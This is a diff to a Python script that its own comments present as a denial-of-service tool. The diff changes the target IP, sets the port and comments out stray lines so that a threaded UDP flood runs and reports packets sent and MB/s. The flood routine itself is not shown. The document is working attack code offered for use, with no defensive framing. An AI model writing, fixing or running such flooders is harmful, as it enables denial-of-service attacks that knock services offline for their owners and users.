@@ -15,7 +15,7 @@ from threading import Thread
 
 #The IP of the website you wish to deed Dos
 #Which can be found by performing a tracert(on windows )
-ip='192.168.137.230'
+ip='192.168.137.18'
 
 #How many threads of your computer you want to dedicate to this task
 threads=50
@@ -48,7 +48,8 @@ def udp(ip,port,floodtime):
 	threads-=1
 
 
-Creates all the multiple thread objects and starts them
+#Creates all the multiple thread objects and starts them
+port=0
 for i in range(0,threads):
 	t=Thread(target=(udp),args=(ip,port,endtime))
 	t.start()
@@ -58,6 +59,6 @@ time.sleep(endtime)
 while threads>=1:
 	print ("Waiting for "+str(threads)+" threads to finish...")
 	time.sleep(1)
-An output of the  results of your attack
+#An output of the  results of your attack
 print("Sent "+str(packets)+" packets, averaging at ~"+str(packets/16/endtime)+" MB/s!")
 exit()
